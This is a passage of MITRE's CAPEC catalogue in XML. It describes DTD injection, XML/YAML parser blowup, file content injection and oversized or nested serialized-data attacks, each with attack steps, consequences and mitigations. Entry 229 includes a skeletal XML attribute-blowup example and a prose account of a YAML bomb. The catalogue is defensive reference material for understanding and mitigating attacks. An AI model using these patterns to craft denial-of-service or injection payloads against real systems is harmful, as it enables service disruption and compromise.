         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1499</ns0:Entry_ID>
               <ns0:Entry_Name>Endpoint Denial of Service</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>10</ns0:Entry_ID>
               <ns0:Entry_Name>Denial of Service</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Extended_Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2023-01-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="228" Name="DTD Injection" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An attacker injects malicious content into an application's DTD in an attempt to produce a negative technical impact. DTDs are used to describe how XML documents are processed. Certain malformed DTDs (for example, those with excessive entity expansion as described in CAPEC 197) can cause the XML parsers that process the DTDs to consume excessive resources resulting in resource depletion.</ns0:Description>
         <ns0:Typical_Severity>Medium</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="250" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="197" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="491" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process XML requests.</ns0:Description>
               <ns0:Technique>Use an automated tool to record all instances of URLs to process XML requests.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how the application processes XML requests.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Determine use of XML with DTDs] Examine application input to identify XML input that leverage the use of one or more DTDs.</ns0:Description>
               <ns0:Technique>Examine any available documentation for the application that discusses expected XML input.</ns0:Technique>
               <ns0:Technique>Exercise the application using XML input with and without a DTD specified. Failure without DTD likely indicates use of DTD.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Craft and inject XML containg malicious DTD payload]</ns0:Description>
               <ns0:Technique>Inject XML expansion attack that creates a Denial of Service impact on the targeted server using its DTD.</ns0:Technique>
               <ns0:Technique>Inject XML External Entity (XEE) attack that can cause the disclosure of confidential information, execute abitrary code, create a Denial of Service of the targeted server, or several other malicious impacts.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The target must be running an XML based application that leverages DTDs.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: Sanitize incoming DTDs to prevent excessive expansion or other actions that could result in impacts like resource depletion.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Disallow the inclusion of DTDs as part of incoming messages.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Use XML parsing tools that protect against DTD attacks.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="829" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-86" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases, Description, Description Summary, Solutions_and_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="229" Name="Serialized Data Parameter Blowup" Abstraction="Detailed" Status="Draft">
         <ns0:Description>This attack exploits certain serialized data parsers (e.g., XML, YAML, etc.) which manage data in an inefficient manner. The attacker crafts an serialized data file with multiple configuration parameters in the same dataset. In a vulnerable parser, this results in a denial of service condition where CPU resources are exhausted because of the parsing algorithm. The weakness being exploited is tied to parser implementation and not language specific.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="231" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process requests using serialized data.</ns0:Description>
               <ns0:Technique>Use an automated tool to record all instances of URLs to process requests from serialized data.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how the application processes requests using serialized data.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Launch a Blowup attack] The attacker crafts malicious messages that contain multiple configuration parameters in the same dataset.</ns0:Description>
               <ns0:Technique>Send the malicious crafted message containing the multiple configuration parameters to the target URL, causing a denial of service.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The server accepts input in the form of serialized data and is using a parser with a runtime longer than O(n) for the insertion of a new configuration parameter in the data container.(examples are .NET framework 1.0 and 1.1)</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Mitigations>
            <ns0:Mitigation>This attack may be mitigated completely by using a parser that is not using a vulnerable container.</ns0:Mitigation>
            <ns0:Mitigation>Mitigation may limit the number of configuration parameters per dataset.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>In this example, assume that the victim is running a vulnerable parser such as .NET framework 1.0. This results in a quadratic runtime of O(n^2).</html:p>
               <html:div style="margin-left:1em;" class="informative">&lt;?xml version="1.0"?&gt;<html:br />&lt;foo<html:br />aaa=""<html:br />ZZZ=""<html:br />...<html:br />999=""<html:br />/&gt;</html:div>
               <html:p>A document with n attributes results in (n^2)/2 operations to be performed. If an operation takes 100 nanoseconds then a document with 100,000 operations would take 500s to process. In this fashion a small message of less than 1MB causes a denial of service condition on the CPU resources.</html:p>
            </ns0:Example>
            <ns0:Example>
               <html:p>A YAML bomb leverages references within a YAML file to create exponential growth in memory requirements. By creating a chain of keys whose values are a list of multiple references to the next key in the chain, the amount of memory and processing required to handle the data grows exponentially. This may lead to denial of service or instability resulting from excessive resource consumption.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="770" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>41</ns0:Entry_ID>
               <ns0:Entry_Name>XML Attribute Blowup</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Activation_Zone, Attack_Phases, Description, Description Summary, Examples-Instances, Injection_Vector, Methods_of_Attack, Payload, Related_Attack_Patterns, Typical_Likelihood_of_Exploit, Typical_Severity</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, Description, Example_Instances, Execution_Flow, Mitigations, Prerequisites</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2020-07-30">XML Attribute Blowup</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="23" Name="File Content Injection" Abstraction="Standard" Status="Draft">
         <ns0:Description>An adversary poisons files with a malicious payload (targeting the file systems accessible by the target software), which may be passed through by standard channels such as via email, and standard web content like PDF and multimedia files. The adversary exploits known vulnerabilities or handling routines in the target processes, in order to exploit the host's trust in executing remote content, including binary files.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>Vulnerabilities of this type have been found in a wide variety of commercial applications from Microsoft Office to Adobe Acrobat and Apple Safari web browser. When the adversary knows the standard handling routines and can identify vulnerabilities and entry points, they can be exploited by otherwise seemingly normal content. Once the attack is executed, the adversary's program can access relative directories such as C:\Program Files or other standard system directories to launch further attacks. In a worst case scenario, these programs are combined with other propagation logic and work as a virus.</html:p>
         </ns0:Extended_Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Very High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="242" />
            <ns0:Related_Attack_Pattern Nature="CanAlsoBe" CAPEC_ID="165" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The target software must consume files.</ns0:Prerequisite>
            <ns0:Prerequisite>The adversary must have access to modify files that the target software will consume.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">How to poison a file with malicious payload that will exploit a vulnerability when the file is opened. The adversary must also know how to place the file onto a system where it will be opened by an unsuspecting party, or force the file to be opened.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: Enforce principle of least privilege</ns0:Mitigation>
            <ns0:Mitigation>Design: Validate all input for content including files. Ensure that if files and remote content must be accepted that once accepted, they are placed in a sandbox type location so that lower assurance clients cannot write up to higher assurance processes (like Web server processes for example)</ns0:Mitigation>
            <ns0:Mitigation>Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.</ns0:Mitigation>
            <ns0:Mitigation>Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Virus scanning on host</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>PHP is a very popular language used for developing web applications. When PHP is used with global variables, a vulnerability may be opened that affects the file system. A standard HTML form that allows for remote users to upload files, may also place those files in a public directory where the adversary can directly access and execute them through a browser. This vulnerability allows remote adversaries to execute arbitrary code on the system, and can result in the adversary being able to erase intrusion evidence from system and application logs.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="20" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Prerequisites, Description Summary, Examples-Instances, Payload_Activation_Impact</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Extended_Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2015-12-07">File System Function Injection, Content Based</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="230" Name="Serialized Data with Nested Payloads" Abstraction="Standard" Status="Draft">
         <ns0:Description>Applications often need to transform data in and out of a data format (e.g., XML and YAML) by using a parser. It may be possible for an adversary to inject data that may have an adverse effect on the parser when it is being processed. Many data format languages allow the definition of macro-like structures that can be used to simplify the creation of complex structures. By nesting these structures, causing the data to be repeatedly substituted, an adversary can cause the parser to consume more resources while processing, causing excessive memory consumption and CPU utilization.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>An adversary's goal is to leverage parser failure to their advantage. In most cases this type of an attack will result in a Denial of Service due to an application becoming unstable, freezing, or crashing. However it may be possible to cause a crash resulting in arbitrary code execution, leading to a jump from the data plane to the control plane [REF-89].</html:p>
            <html:p>This attack is most closely associated with web services using SOAP or a Rest API, because remote service requesters can post malicious payloads to the service provider. The main weakness is that the service provider generally must inspect, parse, and validate the messages to determine routing, workflow, security considerations, and so on. It is exactly these inspection, parsing, and validation routines that this attack targets. This attack exploits the loosely coupled nature of web services, where the service provider has little to no control over the service requester and any messages the service requester sends.</html:p>
         </ns0:Extended_Description>
         <ns0:Alternate_Terms>
            <ns0:Alternate_Term>
               <ns0:Term>XML Denial of Service (XML DoS)</ns0:Term>
            </ns0:Alternate_Term>
         </ns0:Alternate_Terms>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="130">
               <ns0:Exclude_Related Exclude_ID="512" />
            </ns0:Related_Attack_Pattern>
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>An adversary determines the input data stream that is being processed by a data parser that supports using substitution on the victim's side.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>An adversary crafts input data that may have an adverse effect on the operation of the parser when the data is parsed on the victim's system.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>An application's user-controllable data is expressed in a language that supports subsitution.</ns0:Prerequisite>
            <ns0:Prerequisite>An application does not perform sufficient validation to ensure that user-controllable data is not malicious.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Indicators>
            <ns0:Indicator>Bad data is passed to the data parser (possibly repeatedly), possibly making it crash or execute arbitrary code.</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Resource Consumption</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Carefully validate and sanitize all user-controllable data prior to passing it to the data parser routine. Ensure that the resultant data is safe to pass to the data parser.</ns0:Mitigation>
            <ns0:Mitigation>Perform validation on canonical data.</ns0:Mitigation>
            <ns0:Mitigation>Pick a robust implementation of the data parser.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="112" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="674" />
            <ns0:Related_Weakness CWE_ID="770" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-89" Section="What is an XML Parser Attack?" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Alternate_Terms, Description, Execution_Flow, Indicators, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, Description, Execution_Flow, Extended_Description, Indicators, Mitigations, Prerequisites, Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2021-10-21">XML Nested Payloads</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="231" Name="Oversized Serialized Data Payloads" Abstraction="Standard" Status="Draft">
         <ns0:Description>An adversary injects oversized serialized data payloads into a parser during data processing to produce adverse effects upon the parser such as exhausting system resources and arbitrary code execution.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>Applications often need to transform data in and out of serialized data formats, such as XML and YAML, by using a data parser. It may be possible for an adversary to inject data that may have an adverse effect on the parser when it is being processed. By supplying oversized payloads in input vectors that will be processed by the parser, an adversary can cause the parser to consume more resources while processing, causing excessive memory consumption and CPU utilization, and potentially cause execution of arbitrary code. An adversary's goal is to leverage parser failure to their advantage. DoS is most closely associated with web services, SOAP, and Rest, because remote service requesters can post malicious data payloads to the service provider designed to exhaust the service provider's memory, CPU, and/or disk space. This attack exploits the loosely coupled nature of web services, where the service provider has little to no control over the service requester and any messages the service requester sends.</html:p>
         </ns0:Extended_Description>
         <ns0:Alternate_Terms>
            <ns0:Alternate_Term>
               <ns0:Term>XML Denial of Service (XML DoS)</ns0:Term>
            </ns0:Alternate_Term>
         </ns0:Alternate_Terms>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="130">
               <ns0:Exclude_Related Exclude_ID="512" />
            </ns0:Related_Attack_Pattern>
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>An adversary determines the input data stream that is being processed by an serialized data parser on the victim's side.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>An adversary crafts input data that may have an adverse effect on the operation of the data parser when the data is parsed on the victim's system.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>An application uses an parser for serialized data to perform transformation on user-controllable data.</ns0:Prerequisite>
            <ns0:Prerequisite>An application does not perform sufficient validation to ensure that user-controllable data is safe for a data parser.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">Denial of service</ns0:Skill>
            <ns0:Skill Level="High">Arbitrary code execution</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Indicators>
            <ns0:Indicator>Bad data is passed to the serialized data parser (possibly repeatedly), possibly making it crash or execute arbitrary code.</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Resource Consumption</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Carefully validate and sanitize all user-controllable serialized data prior to passing it to the parser routine. Ensure that the resultant data is safe to pass to the parser.</ns0:Mitigation>
            <ns0:Mitigation>Perform validation on canonical data.</ns0:Mitigation>
            <ns0:Mitigation>Pick a robust implementation of the serialized data parser.</ns0:Mitigation>
            <ns0:Mitigation>Validate data against a valid schema or DTD prior to parsing.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="112" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="674" />
            <ns0:Related_Weakness CWE_ID="770" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-89" Section="What is an XML Parser Attack?" />
         </ns0:References>
         <ns0:Notes>
            <ns0:Note Type="Other">In many cases this type of an attack will result in an XML Denial of Service (XDoS) or similar Denial of Service (DoS) due to an application becoming unstable, freezing, or crashing. However it is possible to cause a crash resulting in arbitrary code execution, leading to a jump from the data plane to the control plane [REF-89].</ns0:Note>
            <ns0:Note Type="Other">The main weakness in serialized data related DoS is that the service provider generally must inspect, parse, and validate the data messages to determine routing, workflow, security considerations, and so on. It is exactly these inspection, parsing, and validation routines that DoS targets.</ns0:Note>
         </ns0:Notes>
         <ns0:Content_History>
